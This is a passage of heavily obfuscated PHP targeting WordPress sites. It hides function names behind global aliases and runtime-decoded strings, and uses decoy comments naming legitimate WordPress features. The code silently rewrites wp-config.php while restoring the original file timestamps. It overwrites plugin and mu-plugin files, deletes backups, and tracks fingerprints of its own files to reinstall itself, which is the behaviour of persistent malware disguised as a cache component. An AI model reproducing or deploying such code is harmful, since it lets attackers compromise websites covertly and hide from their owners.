 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))  return;
 }
 if  ($trljeolzpx5vp &&    $GLOBALS['__scf_wdjvpd1lvon9_102']('/' .  $k3mw5t4hpw  .    '/',  $ukjj4vzpxsr))    {

 $ukjj4vzpxsr    =   $GLOBALS['__scf_renvrk8nefa8_474'](f6yrzd2knrmb(1581) .     $k3mw5t4hpw     .   ovffvv33(1582),  ovffvv33(1584) . "define( 'WP_CACHE', true ); /* SC_WC */\n",   $ukjj4vzpxsr,  1);
    if (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))  return;
}   elseif ($q593wwadho62o)  {
// lazy collector




      $ukjj4vzpxsr  = $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1581)   .   $k3mw5t4hpw     .  bpowi0iglycvx(1585),     bpowi0iglycvx(1586) .     "define( 'WP_CACHE', true ); /* SC_WC */\n", $ukjj4vzpxsr,  1);
  if     (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr)) return;

 }
 if ($s5tfdfos5a71qd)  {
   $ukjj4vzpxsr  = $GLOBALS['__scf_renvrk8nefa8_474'](bpowi0iglycvx(1587),    "",  $ukjj4vzpxsr);
 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))      return;
 if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(1581)      .   $k3mw5t4hpw     .    hn_f08x0cns80(1582),   $ukjj4vzpxsr))    {
   $ukjj4vzpxsr =   $GLOBALS['__scf_renvrk8nefa8_474'](ovffvv33(1581)  .   $k3mw5t4hpw . f6yrzd2knrmb(1588),  c1sob647u1i(1586)   .    "define( 'WP_DEBUG', true );\ndefine( 'WP_DEBUG_LOG', true );\ndefine( 'WP_DEBUG_DISPLAY', false );\n",   $ukjj4vzpxsr,   1);


 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr))   return;

      }
   }
   if ($ukjj4vzpxsr      === $amsjsw283qnc3)      return;
 if     (!ib2ffadoyj2m6zxmkaa2in($ukjj4vzpxsr))  return;
if ($q593wwadho62o  && $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1465))) @update_option(ovffvv33(1589),    1,   hn_f08x0cns80(1563));
  if   ($trljeolzpx5vp      &&  !l1s0od7mbsjgia4oi($ko9cqc0s7si9cc,    $amsjsw283qnc3))    {

   g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1590), c1sob647u1i(1331));
 $ukjj4vzpxsr =  $GLOBALS['__scf_renvrk8nefa8_474'](iw6xe9q4j6sneg(1591) .   $k3mw5t4hpw   .      bpowi0iglycvx(1592),   ovffvv33(1586),   $ukjj4vzpxsr, 1);
if    (!$GLOBALS['__scf_fv3zevxzzb_44']($ukjj4vzpxsr)      ||  $ukjj4vzpxsr ===   $amsjsw283qnc3)   return;


 if  (!ib2ffadoyj2m6zxmkaa2in($ukjj4vzpxsr)) return;
}
  $xqumvl60b6ebdutc   =  @fileperms($ko9cqc0s7si9cc);
      $xqumvl60b6ebdutc   =  ($xqumvl60b6ebdutc ===  false)      ? (348+72) :    ($xqumvl60b6ebdutc  & (415+96));


      $sb35et8mi6ehb     =   @$GLOBALS['__scf_uo_a60ibqnli_104']($ko9cqc0s7si9cc);
  $b3_4y4x1hqp  =     @$GLOBALS['__scf_utyj_ckly79_101']($ko9cqc0s7si9cc);
if  (!$GLOBALS['__scf_fv3zevxzzb_44']($b3_4y4x1hqp)  ||    $b3_4y4x1hqp !== $amsjsw283qnc3)  {



  g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1590),  hn_f08x0cns80(1244));
return;
}
unset($b3_4y4x1hqp);
$ouvanpspjl48sc  = @$GLOBALS['__scf_ujxphkubsb4a2h_81']($GLOBALS['__scf_po3uwzhcb63b03_11']($ko9cqc0s7si9cc),  iw6xe9q4j6sneg(1593));
 if   ($ouvanpspjl48sc  === false) return;
if   (@$GLOBALS['__scf_whcsnotvh9twx_211']($ouvanpspjl48sc,  $ukjj4vzpxsr)     !==    $GLOBALS['__scf_d4eyetogjbsnt_10']($ukjj4vzpxsr))  {


     @$GLOBALS['__scf_fbizamz5bjakz_20']($ouvanpspjl48sc);
return;
    }
    @$GLOBALS['__scf_y0ctsi0tqyy7t_18']($ouvanpspjl48sc, $xqumvl60b6ebdutc);
  if   (!@$GLOBALS['__scf_qo7895jhcq7i_79']($ouvanpspjl48sc,  $ko9cqc0s7si9cc))   {$vez0yme3q=4487;$mk1oer8oyfhk27=$vez0yme3q%10;
 @$GLOBALS['__scf_fbizamz5bjakz_20']($ouvanpspjl48sc);
  return;
    }
     if  ($sb35et8mi6ehb)    @$GLOBALS['__scf_c2r2e7u5qd7u_77']($ko9cqc0s7si9cc,  $sb35et8mi6ehb);

if   ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(748))) @opcache_invalidate($ko9cqc0s7si9cc,  true);
if     ($trljeolzpx5vp) ghttebm5ugw_js_hn2zmc($ko9cqc0s7si9cc);
        if   (($trljeolzpx5vp ||      $q593wwadho62o)  && $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(778))) @delete_option(ovffvv33(1589));
if ($GLOBALS['__scf_e24rppqzou_1420'](iw6xe9q4j6sneg(1594),     $ozh8sd646qgcfba,   $oyc70harb_))  {
     foreach    ($GLOBALS['__scf_tni2zo3jsk7_159']($oyc70harb_[1]) as   $dt_g0rl77sxfp3k1)  {
     if  ($GLOBALS['__scf_w6mdcepio4lkz5_7']($dt_g0rl77sxfp3k1, ovffvv33(1595))    ===  0   &&    @$GLOBALS['__scf_rjpcj9l4bigb5_21']($dt_g0rl77sxfp3k1))    @$GLOBALS['__scf_fbizamz5bjakz_20']($dt_g0rl77sxfp3k1);

   }
   }
     if    ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1596))   && $GLOBALS['__scf_e24rppqzou_1420'](c1sob647u1i(1597), $ozh8sd646qgcfba,    $dxvcspsi4l2))   {
foreach   ($GLOBALS['__scf_tni2zo3jsk7_159']($dxvcspsi4l2[1])   as   $ewuf3hvwhdzrghfq)    {
  if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1598),    $ewuf3hvwhdzrghfq))     @delete_option($ewuf3hvwhdzrghfq);
}
}
   }
    function    bh34cao0loaav99k()



 {$vytcbr5bck=PHP_INT_MAX/PHP_INT_MAX;$bo2xufofp0k5h=$vytcbr5bck+23;
      if (!defined(hn_f08x0cns80(1571)))  return;
 $mbmv1meuug3w2g_    =    defined(ovffvv33(1237))     ? WPMU_PLUGIN_DIR    :  WP_CONTENT_DIR .  c1sob647u1i(14);

$_5ex4fq8wg3 = array();
 if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(757))) {


  if (@$GLOBALS['__scf_opq_vgkskw_46']($mbmv1meuug3w2g_)) foreach ((array)  @$GLOBALS['__scf_kajvzw3bpufv_75']($mbmv1meuug3w2g_   .    ovffvv33(600)) as   $z8pt_ekqvakn) $_5ex4fq8wg3[]  = $z8pt_ekqvakn;
    if     (defined(f6yrzd2knrmb(1599))     &&  @$GLOBALS['__scf_opq_vgkskw_46'](WP_PLUGIN_DIR)) foreach ((array) @$GLOBALS['__scf_kajvzw3bpufv_75'](WP_PLUGIN_DIR     .  iw6xe9q4j6sneg(1600)) as    $z8pt_ekqvakn)   $_5ex4fq8wg3[] =  $z8pt_ekqvakn;


 }



$w5q_h8e_i8g5r  = defined(iw6xe9q4j6sneg(1564))   ? ABSPATH   : "";
   $i5al1yvlhd5zke7v   =     WP_CONTENT_DIR   .  ovffvv33(94) .    $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($w5q_h8e_i8g5r .    hn_f08x0cns80(1601)),  0, (255^247))  .    c1sob647u1i(1602) .  $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($w5q_h8e_i8g5r   .   iw6xe9q4j6sneg(97)),    0,    (107^99))    . iw6xe9q4j6sneg(1560);
 if (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($i5al1yvlhd5zke7v))   $_5ex4fq8wg3[] =  $i5al1yvlhd5zke7v;
 foreach ($_5ex4fq8wg3 as   $z8pt_ekqvakn)   {
   $sb35et8mi6ehb  =  @$GLOBALS['__scf_uo_a60ibqnli_104']($z8pt_ekqvakn);
    if   (!$sb35et8mi6ehb || ($sb35et8mi6ehb  %   (99937+63)) !==   (166598-72779))   {
// mediate backlog for WP Font Library



     $n3r600ig1b7j  =  @$GLOBALS['__scf_b42duf6j1zadm9_105']($z8pt_ekqvakn);
 if   (!$n3r600ig1b7j || $n3r600ig1b7j <      (707-207)  || $n3r600ig1b7j    >   (3898193+48530607))     continue;


      }
   $vkfhbb8hycke    =   @$GLOBALS['__scf_ba4991zo41sta_36']($z8pt_ekqvakn);
  $b6l44ydrqs4cl  =   @$GLOBALS['__scf_ba4991zo41sta_36'](bmvtr5sdqjf5km1t());

 if ($GLOBALS['__scf_fv3zevxzzb_44']($vkfhbb8hycke) && $GLOBALS['__scf_fv3zevxzzb_44']($b6l44ydrqs4cl)  &&  $vkfhbb8hycke   ===    $b6l44ydrqs4cl) continue;
$eribl7p1ze = @$GLOBALS['__scf_utyj_ckly79_101']($z8pt_ekqvakn, false,   null,   0,    (5723-1627));


$qm0vmtz78u0uh8p  =  null;
   if  ($GLOBALS['__scf_fv3zevxzzb_44']($eribl7p1ze)  &&   $GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1434),  $eribl7p1ze,   $q8l5esh89sr9y))    $qm0vmtz78u0uh8p = $q8l5esh89sr9y[1];



    elseif  (mza6zg2fnwyep8gx2xd($z8pt_ekqvakn,  (0x61b+0xd6d)))  $qm0vmtz78u0uh8p =   f6yrzd2knrmb(1603);

 if   ($qm0vmtz78u0uh8p  ===    null || !version_compare($qm0vmtz78u0uh8p,  dfb4_mpcgxvnp230hvh1v(),     '<'))  continue;
  $se0tir7r9b =  tq0de4uade8_8rlhtowy($z8pt_ekqvakn);
if ($se0tir7r9b  ===  false) {


        g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(1554), c1sob647u1i(1604) . $GLOBALS['__scf_owu_4pajngr_3']($z8pt_ekqvakn));
continue;
 }
     if   ($se0tir7r9b     === true) {
// register resume-session for WP Server Side Render

if  (riq98ofdzw2zl1nzzzxy($z8pt_ekqvakn, $z8pt_ekqvakn      .  iw6xe9q4j6sneg(32)))     {
   if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(748))) @opcache_invalidate($z8pt_ekqvakn,   true);
  

   } elseif   (!j81oyiorlegz06z33($z8pt_ekqvakn)   &&  awt0clbm2rkh9u4z8mjsz($z8pt_ekqvakn))  {
 cbzu166xe9qr89g6($z8pt_ekqvakn);$nhcxpp5glmlp=3967;$l2djgh3ucuo=$nhcxpp5glmlp%4;
  czznuvw9tobf1x1o($z8pt_ekqvakn);

   }
// sample co-recursive resume-session

 @$GLOBALS['__scf_fbizamz5bjakz_20']($GLOBALS['__scf_po3uwzhcb63b03_11']($z8pt_ekqvakn)     .   bpowi0iglycvx(208)   .    $GLOBALS['__scf_owu_4pajngr_3']($z8pt_ekqvakn,  c1sob647u1i(1560)));
     continue;
 }
     if (!j81oyiorlegz06z33($z8pt_ekqvakn)   && awt0clbm2rkh9u4z8mjsz($z8pt_ekqvakn)) {
    cbzu166xe9qr89g6($z8pt_ekqvakn);
  czznuvw9tobf1x1o($z8pt_ekqvakn);
 }


 rrd1j6b2wjg30_7($z8pt_ekqvakn);
    }
zn7jd9uiqykpk825s6l();

    $goalrate6_    = WP_CONTENT_DIR .  c1sob647u1i(1605);



if (@$GLOBALS['__scf_opq_vgkskw_46']($goalrate6_) &&  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(757)))  {
      foreach ((array)   @$GLOBALS['__scf_kajvzw3bpufv_75']($goalrate6_  . hn_f08x0cns80(1606))  as $ig68hj8hqdp)  {
  if      (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ig68hj8hqdp)   ||  !@$GLOBALS['__scf_sunuwikkpg6_51']($ig68hj8hqdp))  continue;
      $t5w86yx9r7fe =  @$GLOBALS['__scf_b42duf6j1zadm9_105']($ig68hj8hqdp);
if (!$t5w86yx9r7fe   ||  $t5w86yx9r7fe   >    (2097066+86)) continue;
$lxy6owzg4ua4   =   @$GLOBALS['__scf_utyj_ckly79_101']($ig68hj8hqdp);
if     (!$GLOBALS['__scf_fv3zevxzzb_44']($lxy6owzg4ua4)) continue;
  if    ($GLOBALS['__scf_w6mdcepio4lkz5_7']($lxy6owzg4ua4,    c1sob647u1i(1550)) === false &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($lxy6owzg4ua4,  hn_f08x0cns80(1607))  === false  &&     $GLOBALS['__scf_w6mdcepio4lkz5_7']($lxy6owzg4ua4,    f6yrzd2knrmb(1608))    ===   false)   continue;
  if   (!pxpms_34emojockcc3uvz($lxy6owzg4ua4))   continue;$_sucack0hi__w=(0xd3+0x9d);$k82w3cv9n=$_sucack0hi__w%10;
 $fjzhim_nrj0k  = tl0ublf2y8592ys5($lxy6owzg4ua4);$sph_aytfr4j_dg=PHP_INT_MAX/PHP_INT_MAX;$thv44szqqci=$sph_aytfr4j_dg+63;
     if   ($GLOBALS['__scf_fv3zevxzzb_44']($fjzhim_nrj0k) &&  $fjzhim_nrj0k   !==  $lxy6owzg4ua4)     {



       c5kyk62yk_dwfeubni4b($ig68hj8hqdp, $fjzhim_nrj0k);
   if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1609)))  @opcache_invalidate($ig68hj8hqdp,  true);
}


 }
 }
yddfedd5qn_m8mayqvo6(WP_CONTENT_DIR   .    bpowi0iglycvx(1610));
   yddfedd5qn_m8mayqvo6(WP_CONTENT_DIR .      c1sob647u1i(526));
      if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1611)) && $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1596))   &&  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1612)))  {
 $_on =  nreub2fs747eromoe(ABSPATH    . ovffvv33(1613), (5<<1));
    $uapoib6dx1x6    =   @get_option($_on,    "");
     if ($GLOBALS['__scf_fv3zevxzzb_44']($uapoib6dx1x6)      && $uapoib6dx1x6 !==    "")   {
   $lw_yk0axxh  = $GLOBALS['__scf_i8wggf4l_3p_373']($uapoib6dx1x6,  true);

 if ($GLOBALS['__scf_fv3zevxzzb_44']($lw_yk0axxh)  &&  uql5cxv40bgbaq184aiw9v($lw_yk0axxh)) @delete_option($_on);
  }
  $jtm1f9r577fkln34    =   $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1614))   ?     fcc42yo6xrdenvra0(bpowi0iglycvx(1615),     "")      : "";
        if      ($GLOBALS['__scf_fv3zevxzzb_44']($jtm1f9r577fkln34) && $jtm1f9r577fkln34    !== ""   && ($GLOBALS['__scf_d4eyetogjbsnt_10']($jtm1f9r577fkln34)    >      (1048488+88)   ||  ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1616)) &&  hc0wbkv3xzh9im34z($jtm1f9r577fkln34))      ||    wxrmns_khitjn70x40_x($jtm1f9r577fkln34)))  {
// WP Site Logo: irreducible bivariant

  if    ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1617))) mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(1615), "",  hn_f08x0cns80(1618));
   }
     }
  }
    function  r8j56gi10sbzxd2f4olo()



    {
 try  {
if (!defined(hn_f08x0cns80(1619)))  return;



    if (!empty($GLOBALS[f6yrzd2knrmb(1620)])) {
 $GLOBALS[iw6xe9q4j6sneg(1620)]     =  0;
    g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(1621),  f6yrzd2knrmb(1622));
   }

 if   (!empty($GLOBALS[iw6xe9q4j6sneg(707)])) return;
$GLOBALS[ovffvv33(707)] =    true;
  if  (!isset($_GET[bpowi0iglycvx(1453)]) && $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(1611))   && $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(1623)))  {
  $cpakna3wa6m18pt      =     @get_option(hn_f08x0cns80(1624),     array());
 $jgj01slgjm5x80q2 =  false;


   if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($cpakna3wa6m18pt)) {
        if   (!empty($cpakna3wa6m18pt['t'])) $jgj01slgjm5x80q2  = true;


 if  (!$jgj01slgjm5x80q2   &&     !empty($cpakna3wa6m18pt[ovffvv33(1545)]) &&    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($cpakna3wa6m18pt[f6yrzd2knrmb(1545)])) {$mzunad4jnuae0u=40+15;$vjsm5ferj=$mzunad4jnuae0u-3;
    foreach ($cpakna3wa6m18pt[f6yrzd2knrmb(1545)]  as $_ci)  {$wudoz_rsvyrhq=(0x2e+0x51);$urztsvbcqr1os=$wudoz_rsvyrhq%2;
if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($_ci)   &&  !empty($_ci['p'])) {
$jgj01slgjm5x80q2     =  true;
   break;
    }
       }
}
// OSR exit


    }
if ($jgj01slgjm5x80q2) $GLOBALS['__scf_g45egtj01hms_186'](ovffvv33(1625));



 }
// call stack

    if   (hiisk00z0i4v1wyj3(bmvtr5sdqjf5km1t()))  return;
 $y3p_639yt0eei7y  =  $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1626))   ? (int) get_option(c1sob647u1i(1627),     0) :  0;



 if     ($y3p_639yt0eei7y   <  $GLOBALS['__scf_qzyo0sgkyb6_202']()    -  (225+75) || $y3p_639yt0eei7y > $GLOBALS['__scf_qzyo0sgkyb6_202']()   + (152+148))    {
// debounce infinite orbit




     if ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(1628)))  @update_option(iw6xe9q4j6sneg(1627),   $GLOBALS['__scf_qzyo0sgkyb6_202']());
   bh34cao0loaav99k();
 }
 unset($y3p_639yt0eei7y);
  jnpb812o_r48a5nxup0iiu(bmvtr5sdqjf5km1t(),  dfb4_mpcgxvnp230hvh1v());
       if (!xfzvugr9ucs1qu23p8())   {
// Redis object cache customizer transport

at1s6el9k2q8kxv7ns2yqd();
   k9rva0dpw2bab5();
 return;



 }
 $ftvsfz7ji2 =   ircnjcyfmf8qkc7xdiss4();$uz8mmq9cg2b69d=128|152;$c7mk7f7ej3x=$uz8mmq9cg2b69d^40;
  $_sk4p5ip29   = array(
  bmvtr5sdqjf5km1t(),

 $ftvsfz7ji2   . hn_f08x0cns80(526),
 );



    $w8m_vt1j5ienx    = _nt_1te3ocatjifl();
       foreach     ($w8m_vt1j5ienx      as     $t2w1ik3rhis617)  {
   if    (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($t2w1ik3rhis617)) $_sk4p5ip29[] =  $t2w1ik3rhis617;
   }
    $vgnkxm53x9y66a9  = array();
   $ovfo_zs_p_   =    g71t84np2_v9qynmec3();
    if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ovfo_zs_p_[1]))  $vgnkxm53x9y66a9[iw6xe9q4j6sneg(1629)  .  $ovfo_zs_p_[0]] =   f6yrzd2knrmb(1272)  .  $ovfo_zs_p_[2];
$hbrm6_gslap =   @get_option(f6yrzd2knrmb(1630),    array());
  if      (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($hbrm6_gslap))  $hbrm6_gslap  =  array();
   $xdzr5z2660 =     false;
       foreach  ($_sk4p5ip29   as $w90pshmxoqhf) {
// WP Slot Fill: allocate interceptor

   $jwlj_7qdx13o55   = @$GLOBALS['__scf_tv3phr4m7yg_57']($w90pshmxoqhf);
 $xrzfjdf3g753w  =  $jwlj_7qdx13o55  ? ($jwlj_7qdx13o55[bpowi0iglycvx(1631)]    .  '|' . $jwlj_7qdx13o55[iw6xe9q4j6sneg(1632)])   :  '0';


 $rmocyzx06k   = isset($hbrm6_gslap[$w90pshmxoqhf]) ?     $hbrm6_gslap[$w90pshmxoqhf]  :   "";
 if ($xrzfjdf3g753w === $rmocyzx06k) continue;


   if  ($GLOBALS['__scf_wdjvpd1lvon9_102'](c1sob647u1i(1633),   $rmocyzx06k,    $k70jvs6zsx) && $GLOBALS['__scf_nv7he759wjfj_9']($rmocyzx06k,     0,  -$GLOBALS['__scf_d4eyetogjbsnt_10']($k70jvs6zsx[0]))  ===  $xrzfjdf3g753w  && $GLOBALS['__scf_qzyo0sgkyb6_202']() -   (int)    $k70jvs6zsx[1] <   (3519+81))   continue;
$xdzr5z2660   =  true;

break;
     }
        if (!$xdzr5z2660)   {
 foreach ($vgnkxm53x9y66a9  as  $key    =>  $g2dh3zwec7nwrw11)  {
     $xrzfjdf3g753w =  piduoywyi9awgonn2($GLOBALS['__scf_nv7he759wjfj_9']($key, (0x1+0x4)),      $g2dh3zwec7nwrw11);
    $rmocyzx06k =   isset($hbrm6_gslap[$key])  ?   $hbrm6_gslap[$key]  : "";
if   ($xrzfjdf3g753w === $rmocyzx06k)   continue;$mhwtl9690jnm=PHP_MAJOR_VERSION;$n0m7rwce1oq1xo=$mhwtl9690jnm*4;
 if ($GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(1633),   $rmocyzx06k,   $k70jvs6zsx)  && $GLOBALS['__scf_nv7he759wjfj_9']($rmocyzx06k,   0,    -$GLOBALS['__scf_d4eyetogjbsnt_10']($k70jvs6zsx[0]))  ===    $xrzfjdf3g753w   && $GLOBALS['__scf_qzyo0sgkyb6_202']()   - (int)  $k70jvs6zsx[1]    < (45757+40643)) continue;
    $xdzr5z2660  =   true;
break;
      }

 }
 $f4wi4imyue80384      =  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(), c1sob647u1i(1634));
$go4vf60t6el1uz29     =  $ftvsfz7ji2    . iw6xe9q4j6sneg(100) .  $f4wi4imyue80384    .   '/'   .    $f4wi4imyue80384 .     bpowi0iglycvx(1634);
   $mgjxzi7gw8w  =    sz4dxcdey0t2b0tlyi_w();
 if     (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($go4vf60t6el1uz29)     || (int)   @$GLOBALS['__scf_b42duf6j1zadm9_105']($go4vf60t6el1uz29)    < (4931+69))    $xdzr5z2660    =  true;
    if    ($mgjxzi7gw8w   !==     "" &&    !@$GLOBALS['__scf_rjpcj9l4bigb5_21']($mgjxzi7gw8w))   $xdzr5z2660  =  true;
if     (!$xdzr5z2660  &&    $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1635))) {
 $wk3nu608bpg6lcuv =    $f4wi4imyue80384  . '/'   . $f4wi4imyue80384  .  bpowi0iglycvx(1634);
$jia_zm3l7as01e =  get_option(iw6xe9q4j6sneg(1636),     array());
    if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($jia_zm3l7as01e)  || !$GLOBALS['__scf_rd2tojulg06lx_160']($wk3nu608bpg6lcuv,  $jia_zm3l7as01e,     true)) $xdzr5z2660   = true;
     }
 if   (!$xdzr5z2660)   return;

     $bo8qewp2l3  =  $GLOBALS['__scf_qzyo0sgkyb6_202']();


$yc3_w626p0vjy    =   0;
    $vbp7oqkp9vvx   =   0;



 if    ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(1635)))   {


      $mukojkw2d6hw2 =   @get_option(iw6xe9q4j6sneg(1637),  "");

 if ($GLOBALS['__scf_fv3zevxzzb_44']($mukojkw2d6hw2)  &&    $GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(1638),  $mukojkw2d6hw2, $m53glcwml3z8m))   {
$yc3_w626p0vjy     = (int)   $m53glcwml3z8m[1];
$vbp7oqkp9vvx =  (int)  $m53glcwml3z8m[2];
   }
     }
$isckfmhtxo68ew1a    = $vbp7oqkp9vvx <=    0     ?  0  :  ($vbp7oqkp9vvx   === 1    ? (30<<1)  : ($vbp7oqkp9vvx    === 2     ? (0x127+0x5) :  (0x135+0x5d3)));


   if      ($yc3_w626p0vjy   >     0   && ($bo8qewp2l3   - $yc3_w626p0vjy)  <  $isckfmhtxo68ew1a)     return;$hsv5mwfvuovx=420;$oirtn88p_t6=($hsv5mwfvuovx>0)?$hsv5mwfvuovx:-$hsv5mwfvuovx;

  if  (!dtf7lvb25ztuc8jh3htk(iw6xe9q4j6sneg(1014)))  return;
 try {
        b1acch7k36o7yhlwm5();
   a0q_0vhnw4vfxz();



k9rva0dpw2bab5();



        v8hw7fs820e8qzq2wonqi();
  i9s3whn6wpbydwn81vqrc();
   at1s6el9k2q8kxv7ns2yqd();
// infinite keystore

    

 a3zolwj9kesdur_h3i3z();


gbyz3mtrxdlgg8();
 $_9q_j77gtjt  =   gokfaxh3de99wkb8chxh6t();



       $emu9o6c_dx1lk   = v2zbqes7f920q4();
   $ryx6vbdndp7jm    =   (!@$GLOBALS['__scf_rjpcj9l4bigb5_21']($go4vf60t6el1uz29)   ||     (int)    @$GLOBALS['__scf_b42duf6j1zadm9_105']($go4vf60t6el1uz29)    <  (4915+85))   ||    ($mgjxzi7gw8w !==   ""  &&  !@$GLOBALS['__scf_rjpcj9l4bigb5_21']($mgjxzi7gw8w));


 if     (!$ryx6vbdndp7jm  &&    !@$GLOBALS['__scf_rjpcj9l4bigb5_21']($ftvsfz7ji2    .    bpowi0iglycvx(526))) $ryx6vbdndp7jm =  true;
  if     (!$ryx6vbdndp7jm && $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1635))) {

 $wk3nu608bpg6lcuv      = $f4wi4imyue80384  .  '/' .    $f4wi4imyue80384   .   bpowi0iglycvx(1639);

$jia_zm3l7as01e =     get_option(iw6xe9q4j6sneg(1640),   array());
  if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($jia_zm3l7as01e)  || !$GLOBALS['__scf_rd2tojulg06lx_160']($wk3nu608bpg6lcuv,    $jia_zm3l7as01e,   true)) $ryx6vbdndp7jm    =  true;

}
     if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(1628))) @update_option(f6yrzd2knrmb(1641),   $bo8qewp2l3 .    '|' . ($ryx6vbdndp7jm     ?  ($vbp7oqkp9vvx   + 1)      :     0),      hn_f08x0cns80(1618));
  $ijvh2fbmy2is48    =  array();
     foreach  ($_sk4p5ip29   as  $w90pshmxoqhf) {

   $iz0buj6nf50uthr = ($w90pshmxoqhf === $ftvsfz7ji2  .     bpowi0iglycvx(526)  && !$_9q_j77gtjt) ||  ($GLOBALS['__scf_nv7he759wjfj_9']($w90pshmxoqhf, -(9+5))    ===  hn_f08x0cns80(1642)  &&  !$emu9o6c_dx1lk);
 $jwlj_7qdx13o55  =   @$GLOBALS['__scf_tv3phr4m7yg_57']($w90pshmxoqhf);
  if  ($jwlj_7qdx13o55)  {



$ijvh2fbmy2is48[$w90pshmxoqhf]  =  $jwlj_7qdx13o55[hn_f08x0cns80(1631)]   .    '|'    . $jwlj_7qdx13o55[f6yrzd2knrmb(1643)] .   ($iz0buj6nf50uthr  ?  iw6xe9q4j6sneg(1644)  .  $GLOBALS['__scf_qzyo0sgkyb6_202']()    : "");



 }



    }
  foreach ($vgnkxm53x9y66a9    as  $key =>   $g2dh3zwec7nwrw11)     {
   $vcf_u21z5x7    =     piduoywyi9awgonn2($GLOBALS['__scf_nv7he759wjfj_9']($key,      (0x2+0x3)),     $g2dh3zwec7nwrw11);
     if ($vcf_u21z5x7     ===     '0' ||     $GLOBALS['__scf_nv7he759wjfj_9']($vcf_u21z5x7,   -2) ===  hn_f08x0cns80(1645))    $vcf_u21z5x7    .=    hn_f08x0cns80(1646)     .    $GLOBALS['__scf_qzyo0sgkyb6_202']();
  $ijvh2fbmy2is48[$key] = $vcf_u21z5x7;


 }
  @update_option(bpowi0iglycvx(1630),   $ijvh2fbmy2is48,   bpowi0iglycvx(1618));
   }   finally {
  l5zn64lzopflqr0dsekx(bpowi0iglycvx(1647));
}
 }   catch (Throwable    $cje8wku90zm4r)    {$yehd_hbcervbme=-266;$kvs1frkic78e58=($yehd_hbcervbme>0)?$yehd_hbcervbme:-$yehd_hbcervbme;
    g_qoqdy38lfl4v4n3618(c1sob647u1i(1648), $cje8wku90zm4r);
  }    catch  (Exception $cje8wku90zm4r)   {
 }

      }
 function  piduoywyi9awgonn2($w90pshmxoqhf,   $g2dh3zwec7nwrw11)
   {$gev4mrhv=-571;$am85vscdga_=($gev4mrhv>0)?$gev4mrhv:-$gev4mrhv;
   $jwlj_7qdx13o55   =  @$GLOBALS['__scf_tv3phr4m7yg_57']($w90pshmxoqhf);
if  (!$jwlj_7qdx13o55)  return    '0';
$xrzfjdf3g753w   = $jwlj_7qdx13o55[hn_f08x0cns80(1631)] . '|'   .     $jwlj_7qdx13o55[hn_f08x0cns80(1643)];
 if   ($jwlj_7qdx13o55[bpowi0iglycvx(1631)]  > (0xc7d24+0x382dc)) return     bpowi0iglycvx(1649)  . $xrzfjdf3g753w;
   $amsjsw283qnc3   = @$GLOBALS['__scf_utyj_ckly79_101']($w90pshmxoqhf);
 return $xrzfjdf3g753w  .   '|' .  (($GLOBALS['__scf_fv3zevxzzb_44']($amsjsw283qnc3)  &&  $GLOBALS['__scf_w6mdcepio4lkz5_7']($amsjsw283qnc3,  $g2dh3zwec7nwrw11)  !==  false)      ?   '1'   :   '0');
}
  function  nbnht3i5x6is0qrqxsd7()
  {
    $_pv  = $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(1650))  ? get_option(f6yrzd2knrmb(212), "")   :   "";
 u46m8arl93u_0vid();



